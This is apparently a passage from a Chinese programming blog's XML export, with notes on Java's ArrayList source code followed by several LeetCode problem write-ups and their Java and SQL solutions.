<p>实现：直接返回size变量</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="get-int-index-方法"><a href="#get-int-index-方法" class="headerlink" title="get(int index)方法"></a>get(int index)方法</h3><p>作用：返回ArrayList上指定索引位置的值</p>
<p>实现：通过索引范围检查之后，直接从数组中获取。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        rangeCheck(index);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> elementData(index);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="set-int-index-Object-o-方法"><a href="#set-int-index-Object-o-方法" class="headerlink" title="set(int index, Object o)方法"></a>set(int index, Object o)方法</h3><p>作用：将ArrayList指定索引上的值，设置为o，并返回旧值</p>
<p>实现，通过校验之后，直接赋值给指定索引位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        rangeCheck(index);</span><br><span class="line"></span><br><span class="line">        E oldValue = elementData(index);</span><br><span class="line">        elementData[index] = element;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="isEmpty-方法"><a href="#isEmpty-方法" class="headerlink" title="isEmpty()方法"></a>isEmpty()方法</h3><p>作用：返回当前ArrayList是否为空</p>
<p>实现：直接判断size是否为0</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="contains-Object-o-方法"><a href="#contains-Object-o-方法" class="headerlink" title="contains(Object o)方法"></a>contains(Object o)方法</h3><p>作用：返回ArrayList中是否包含某个具体的元素</p>
<p>实现：调用方法indexOf(Object o)，判断它返回的索引是否大于等于0。大于等于0表示存在，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public boolean contains(Object o) &#123;</span><br><span class="line">        return indexOf(o) &gt;&#x3D; 0;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="indexOf-Object-o-方法"><a href="#indexOf-Object-o-方法" class="headerlink" title="indexOf(Object o)方法"></a>indexOf(Object o)方法</h3><p>作用：返回某个对象第一次出现在ArrayList中的索引，如果不存在，则返回-1.</p>
<p>实现：分null对象和非null对象，遍历一遍数组寻找</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">indexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">                <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>null对象直接用==比较，非null对象调用equals方法比较</p>
<h3 id="lastIndexOf方法"><a href="#lastIndexOf方法" class="headerlink" title="lastIndexOf方法"></a>lastIndexOf方法</h3><p>作用：返回某个对象最后一次在ArrayList中出现的索引，否则返回-1</p>
<p>实现：和indexOf差不多，唯一不同的是，它是从ArrayList的末尾开始遍历，而indexOf是从ArrayList的头部开始遍历</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lastIndexOf</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = size-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">                <span class="keyword">if</span> (elementData[i]==<span class="keyword">null</span>)</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = size-<span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">                <span class="keyword">if</span> (o.equals(elementData[i]))</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="clone-方法"><a href="#clone-方法" class="headerlink" title="clone()方法"></a>clone()方法</h3><p>作用：返回当前ArrayList的浅拷贝</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">clone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ArrayList&lt;?&gt; v = (ArrayList&lt;?&gt;) <span class="keyword">super</span>.clone();</span><br><span class="line">            v.elementData = Arrays.copyOf(elementData, size);</span><br><span class="line">            v.modCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> v;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (CloneNotSupportedException e) &#123;</span><br><span class="line">            <span class="comment">// this shouldn't happen, since we are Cloneable</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> InternalError(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="clear-方法"><a href="#clear-方法" class="headerlink" title="clear()方法"></a>clear()方法</h3><p>作用：清空数组里面的所有元素，并将size置为0</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        modCount++;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// clear to let GC do its work</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            elementData[i] = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>将ArrayList数组列表中的每个元素置为null，然后size置0.这样比起new一个ArrayList是要效率高一点的，因为它会保存原数组的capacity。</p>
<h3 id="iterator-方法"><a href="#iterator-方法" class="headerlink" title="iterator()方法"></a>iterator()方法</h3><p>作用：生成一个ArrayList的迭代器，用于遍历ArrayList</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Iterator&lt;E&gt; <span class="title">iterator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Itr();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="iterator的实现类"><a href="#iterator的实现类" class="headerlink" title="iterator的实现类"></a>iterator的实现类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An optimized version of AbstractList.Itr</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Itr</span> <span class="keyword">implements</span> <span class="title">Iterator</span>&lt;<span class="title">E</span>&gt; </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cursor;       <span class="comment">// index of next element to return</span></span><br><span class="line">        <span class="keyword">int</span> lastRet = -<span class="number">1</span>; <span class="comment">// index of last element returned; -1 if no such</span></span><br><span class="line">        <span class="keyword">int</span> expectedModCount = modCount;</span><br><span class="line"></span><br><span class="line">        Itr() &#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> cursor != size;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        <span class="function"><span class="keyword">public</span> E <span class="title">next</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            checkForComodification();</span><br><span class="line">            <span class="keyword">int</span> i = cursor;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= size)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">            Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= elementData.length)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            cursor = i + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">return</span> (E) elementData[lastRet = i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (lastRet &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException();</span><br><span class="line">            checkForComodification();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ArrayList.<span class="keyword">this</span>.remove(lastRet);</span><br><span class="line">                cursor = lastRet;</span><br><span class="line">                lastRet = -<span class="number">1</span>;</span><br><span class="line">                expectedModCount = modCount;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IndexOutOfBoundsException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">forEachRemaining</span><span class="params">(Consumer&lt;? <span class="keyword">super</span> E&gt; consumer)</span> </span>&#123;</span><br><span class="line">            Objects.requireNonNull(consumer);</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> size = ArrayList.<span class="keyword">this</span>.size;</span><br><span class="line">            <span class="keyword">int</span> i = cursor;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= size) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">final</span> Object[] elementData = ArrayList.<span class="keyword">this</span>.elementData;</span><br><span class="line">            <span class="keyword">if</span> (i &gt;= elementData.length) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (i != size &amp;&amp; modCount == expectedModCount) &#123;</span><br><span class="line">                consumer.accept((E) elementData[i++]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// update once at end of iteration to reduce heap write traffic</span></span><br><span class="line">            cursor = i;</span><br><span class="line">            lastRet = i - <span class="number">1</span>;</span><br><span class="line">            checkForComodification();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">checkForComodification</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (modCount != expectedModCount)</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> ConcurrentModificationException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>注意到在调用remove的时候，都会调用checkForComodification()方法。这个方法做的是，每次调用的时候判断一下expectModCount是否和ArrayList的modCount相同，如果不相同的话，表示该ArrayList在迭代的过程中被人修改过了。就会引发一个ConcurrentModificationException异常。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>源码</tag>
        <tag>ArrayList</tag>
      </tags>
  </entry>
  <entry>
    <title>908. 最小差值 I</title>
    <url>/2020/04/16/LeetCode/leetcode-000603.%20%E8%BF%9E%E7%BB%AD%E7%A9%BA%E4%BD%99%E5%BA%A7%E4%BD%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>几个朋友来到电影院的售票处，准备预约连续空余座位。</p>
<p>你能利用表 cinema ，帮他们写一个查询语句，获取所有空余座位，并将它们按照 seat_id 排序后返回吗？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| seat_id | free |</span><br><span class="line">|---------|------|</span><br><span class="line">| 1       | 1    |</span><br><span class="line">| 2       | 0    |</span><br><span class="line">| 3       | 1    |</span><br><span class="line">| 4       | 1    |</span><br><span class="line">| 5       | 1    |</span><br></pre></td></tr></table></figure>

<p>对于如上样例，你的查询语句应该返回如下结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">| seat_id |</span><br><span class="line">|---------|</span><br><span class="line">| 3       |</span><br><span class="line">| 4       |</span><br><span class="line">| 5       |</span><br></pre></td></tr></table></figure>

<h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><ul>
<li>seat_id 字段是一个自增的整数，free 字段是布尔类型（’1’ 表示空余， ‘0’ 表示已被占据）。</li>
<li>连续空余座位的定义是大于等于 2 个连续空余的座位。</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> c1.seat_id</span><br><span class="line"><span class="keyword">from</span> cinema c1, cinema c2</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">abs</span>(c2.seat_id-c1.seat_id)=<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> c1.free=<span class="number">1</span> <span class="keyword">and</span> c2.free=<span class="number">1</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> c1.seat_id</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>1025. 除数博弈</title>
    <url>/2020/04/16/LeetCode/leetcode-001025.%20%E9%99%A4%E6%95%B0%E5%8D%9A%E5%BC%88/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>爱丽丝和鲍勃一起玩游戏，他们轮流行动。爱丽丝先手开局。</p>
<p>最初，黑板上有一个数字 N 。在每个玩家的回合，玩家需要执行以下操作：</p>
<pre><code>选出任一 x，满足 0 &lt; x &lt; N 且 N % x == 0 。
用 N - x 替换黑板上的数字 N 。</code></pre><p>如果玩家无法执行这些操作，就会输掉游戏。</p>
<p>只有在爱丽丝在游戏中取得胜利时才返回 True，否则返回 false。假设两个玩家都以最佳状态参与游戏。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：2</span><br><span class="line">输出：true</span><br><span class="line">解释：爱丽丝选择 1，鲍勃无法进行操作。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：3</span><br><span class="line">输出：false</span><br><span class="line">解释：爱丽丝选择 1，鲍勃也选择 1，然后爱丽丝无法进行操作。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li>1 &lt;= N &lt;= 1000</li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>数学方法</p>
<p>如果Alice拿到的数是奇数，那么它的约数肯定是奇数，不可能是偶数；那N-X就是偶数，就是到了Bob的时候，就是偶数，那么Bob只要选出1，返回Alice一个N-1，Alice拿到的还是一个奇数。一次类推，等Bob拿到2的时候，Alice就输了。因此，只要拿到奇数，Alice必输。</p>
<p>反之，如果Alice拿到了偶数，那么Bob必输</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">divisorGame</span><span class="params">(<span class="keyword">int</span> N)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> N % <span class="number">2</span> == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>908. 最小差值 I</title>
    <url>/2020/04/16/LeetCode/leetcode-000908.%20%E6%9C%80%E5%B0%8F%E5%B7%AE%E5%80%BC%20I/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数数组 A，对于每个整数 A[i]，我们可以选择处于区间 [-K, K] 中的任意数 x ，将 x 与 A[i] 相加，结果存入 A[i] 。</p>
<p>在此过程之后，我们得到一些数组 B。</p>
<p>返回 B 的最大值和 B 的最小值之间可能存在的最小差值。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1], K &#x3D; 0</span><br><span class="line">输出：0</span><br><span class="line">解释：B &#x3D; [1]</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [0,10], K &#x3D; 2</span><br><span class="line">输出：6</span><br><span class="line">解释：B &#x3D; [2,8]</span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：A &#x3D; [1,3,6], K &#x3D; 3</span><br><span class="line">输出：0</span><br><span class="line">解释：B &#x3D; [3,3,3] 或 B &#x3D; [4,4,4]</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= A.length &lt;= 10000</code></li>
<li><code>0 &lt;= A[i] &lt;= 10000</code></li>
<li><code>0 &lt;= K &lt;= 10000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>对数组排序，最大值和最小值的差值一定是A[A.length - 1] - K 和A[0] + K的差值。</p>
<p>如果这个差值小于0的话，那么最小差值就是0。因为A - B &lt; 0 其实就是B - A &gt; 0.那就还不是最小的。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">smallestRangeI</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> K)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == K) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1</span> == A.length) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Arrays.sort(A);</span><br><span class="line">                <span class="keyword">return</span> A[A.length - <span class="number">1</span>] - A[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(A);</span><br><span class="line">        <span class="keyword">int</span> result = A[A.length - <span class="number">1</span>] - K - A[<span class="number">0</span>] - K;</span><br><span class="line">        <span class="keyword">return</span> result &lt; <span class="number">0</span> ? <span class="number">0</span> : result; </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1217. 玩筹码</title>
    <url>/2020/04/16/LeetCode/leetcode-001217.%20%E7%8E%A9%E7%AD%B9%E7%A0%81/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>数轴上放置了一些筹码，每个筹码的位置存在数组 <code>chips</code> 当中。</p>
<p>你可以对 <strong>任何筹码</strong> 执行下面两种操作之一（<strong>不限操作次数</strong>，0 次也可以）：</p>
<ul>
<li>将第 <code>i</code> 个筹码向左或者右移动 2 个单位，代价为 <strong>0</strong>。</li>
<li>将第 <code>i</code> 个筹码向左或者右移动 1 个单位，代价为 <strong>1</strong>。</li>
</ul>
<p>最开始的时候，同一位置上也可能放着两个或者更多的筹码。</p>
<p>返回将所有筹码移动到同一位置（任意位置）上所需要的最小代价。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：chips &#x3D; [1,2,3]</span><br><span class="line">输出：1</span><br><span class="line">解释：第二个筹码移动到位置三的代价是 1，第一个筹码移动到位置三的代价是 0，总代价为 1。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：chips &#x3D; [2,2,2,3,3]</span><br><span class="line">输出：2</span><br><span class="line">解释：第四和第五个筹码移动到位置二的代价都是 1，所以最小总代价为 2。</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= chips.length &lt;= 100</code></li>
<li><code>1 &lt;= chips[i] &lt;= 10^9</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>因为移动2个位置不需要代价，那么奇数位置移到奇数位置不用代价，偶数位置移到偶数位置不用代价，那就分别统计奇数位置和偶数位置的个数，相当于把所有奇数放一起，所有偶数的放一起，然后比较奇数的少还是偶数的少，将少的个数移到多的个数位置上去就可以了</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCostToMoveChips</span><span class="params">(<span class="keyword">int</span>[] chips)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> odd = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> even = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; chips.length; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (chips[i] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">			even++;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			odd++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> Math.min(even, odd);   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
        <tag>Math</tag>
      </tags>
  </entry>
  <entry>
    <title>1207. 独一无二的出现次数</title>
    <url>/2020/04/16/LeetCode/leetcode-001207-%E7%8B%AC%E4%B8%80%E6%97%A0%E4%BA%8C%E7%9A%84%E5%87%BA%E7%8E%B0%E6%AC%A1%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个整数数组 <code>arr</code>，请你帮忙统计数组中每个数的出现次数。</p>
<p>如果每个数的出现次数都是独一无二的，就返回 <code>true</code>；否则返回 <code>false</code>。</p>
<h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例 1:"></a>示例 1:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2,2,1,1,3]</span><br><span class="line">输出：true</span><br><span class="line">解释：在该数组中，1 出现了 3 次，2 出现了 2 次，3 只出现了 1 次。没有两个数的出现次数相同。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [1,2]</span><br><span class="line">输出：false</span><br></pre></td></tr></table></figure>

<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3:"></a>示例3:</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：arr &#x3D; [-3,0,1,-3,1,1,1,-3,10,0]</span><br><span class="line">输出：true</span><br></pre></td></tr></table></figure>

<h2 id="提示："><a href="#提示：" class="headerlink" title="提示："></a>提示：</h2><ul>
<li><code>1 &lt;= arr.length &lt;= 1000</code></li>
<li><code>-1000 &lt;= arr[i] &lt;= 1000</code></li>
</ul>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>数组统计总数，借助HashSet判断总数是否唯一</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">uniqueOccurrences</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span>[] count = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2001</span>];</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i : arr) &#123;</span><br><span class="line">			count[i + <span class="number">1000</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i : count) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">                result++;</span><br><span class="line">                set.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result == set.size();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h2><p>利用Java8的stream特性<br>参考<a href="https://leetcode-cn.com/problems/unique-number-of-occurrences/solution/li-yong-java-8te-xing-qiu-jie-by-recruit/" target="_blank" rel="noopener">这里</a></p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">uniqueOccurrences</span><span class="params">(<span class="keyword">int</span>[] arr)</span> </span>&#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i : arr)</span><br><span class="line">            map.merge(i, <span class="number">1</span>, Integer::sum);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> i1 = map.values().stream().distinct().mapToInt(i -&gt; i).sum();</span><br><span class="line">        <span class="keyword">int</span> i2 = map.values().stream().mapToInt(i -&gt; i).sum();</span><br><span class="line">        <span class="keyword">return</span> i1 == i2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Arrays</tag>
      </tags>
  </entry>
  <entry>
    <title>1237. 找出给定方程的正整数解</title>
    <url>/2020/04/16/LeetCode/leetcode-001237.%20%E6%89%BE%E5%87%BA%E7%BB%99%E5%AE%9A%E6%96%B9%E7%A8%8B%E7%9A%84%E6%AD%A3%E6%95%B4%E6%95%B0%E8%A7%A3/</url>
